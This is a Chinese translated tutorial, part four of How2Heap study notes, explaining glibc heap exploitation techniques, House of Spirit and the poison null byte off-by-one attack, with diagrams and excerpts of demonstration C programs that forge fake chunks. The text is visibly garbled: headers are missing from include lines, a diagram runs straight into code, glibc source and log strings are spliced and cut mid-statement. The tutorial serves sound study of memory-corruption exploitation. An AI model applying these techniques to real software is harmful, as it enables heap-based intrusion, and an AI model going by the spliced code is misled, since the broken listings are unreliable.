# How2Heap堆利用学习笔记（四）
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
通过前三篇文章的学习，我们了解了堆利用的基本概念和技术。本篇文章，我们将要了解堆利用中的House技术以及与off by one结合后的利用手法。
House
of系列并不是某种漏洞的大类，而是堆利用的一些技巧，最早在，其适用性取决的当前的漏洞环境，非常考验攻击者对堆管理的熟悉程度，和思维的灵活性。学习这部分切记不可死记硬背，而是需要多思考漏洞产生的原因，多看glibc源代码，也可以为将来分析实际漏洞打基础。
## 0x01 House Of Spirit
House of Spirit技术是一类组合型漏洞，通常需要结合其他漏洞一起作用。
核心原理时通过free一个伪造的chunk，来控制一块我们本来无法读写的位置。关键的部分是在free时，需要控制chunk的size和nextsize的值，而这两个值的位置大概如图所示，
    +------------------+
    |        |   size  |
    +------------------+
    |                  |
    |    fake chunk    |
    |                  |
    +------------------+
    |         |nextsize|
    +------------------+
**利用场景**
  * **场景1.** 最经典的利用场景便是，利用house of spirit来控制一块不可控的内存空间。 
        +------------------+
    |     可控区域1     |
    +------------------+
    | 目标区域（不可控，  |
    | 多为返回地址/函数  |
    | 指针等）          |
    +------------------+
    |     可控区域2     |
    +------------------+
  * **场景2.** 作为一个组合型漏洞，house of spirit同样也可以结合double free来实现一个fastbin_attack。在 off by one漏洞中，创造一个可控的重叠chunk，通过house of spirit在chunk中间free出一个fake chunk。然后因为地址可控，所以对fake chunk实现fastbin attack。 
        +------------------+
    #include 
    int main()
    {
        fprintf(stderr, "This file demonstrates the house of spirit attack.n");
        fprintf(stderr, "Calling malloc() once so that it sets up its memory.n");
        malloc(1);
        fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.n");
        unsigned long long *a;
        // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
        fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);
        fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category ( 2*SIZE_SZ (> 16 on x64) && system_mem (top)
    #endif
          ) {
        if (__builtin_expect (chunk_at_offset (p, size)->size = av->system_mem, 0)) 
        }
  * free的内存大小不能大于fastbin的最大值（128）程序定义了fake_chunk的结构如下,
    fake_chunks[1] = 0x40; // this is the size
        fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && system_mem (
    #include 
    #include 
    #include 
    #include 
    int main()
    {
        fprintf(stderr, "Welcome to poison null byte 2.0!n");
        fprintf(stderr, "Tested in Ubuntu 14.04 64bit.n");
        fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.n");
        fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.n");
        uint8_t* a;
        uint8_t* b;
        uint8_t* c;
        uint8_t* b1;
        uint8_t* b2;
        uint8_t* d;
        void *barrier;
        fprintf(stderr, "We allocate 0x100 bytes for 'a'.n");
        a = (uint8_t*) malloc(0x100);
        fprintf(stderr, "a: %pn", a);
        int real_a_size = malloc_usable_size(a);
        fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "
            "(it may be more than 0x100 because of rounding): %#xn", real_a_size);
        /* chunk size attribute cannot have a least significant byte with a value of 0x00.
         * the least significant byte of this will be 0x10, because the size of the chunk includes
         * the amount requested plus some amount required for the metadata. */
        b = (uint8_t*) malloc(0x200);
        fprintf(stderr, "b: %pn", b);
        c = (uint8_t*) malloc(0x100);
        fprintf(stderr, "c: %pn", c);
        barrier =  malloc(0x100);
        fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.n"
            "The barrier is not strictly necessary, but makes things less confusingn", barrier);
        uint64_t* b_size_ptr = (uint64_t*)(b - 8);
        // added fix for size==prev_size(next_chunk) check in newer versions of glibc
        // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
        // this added check requires we are allowed to have null pointers in b (not just a c string)
        //*(size_t*)(b+0x1f0) = 0x200;
        fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass "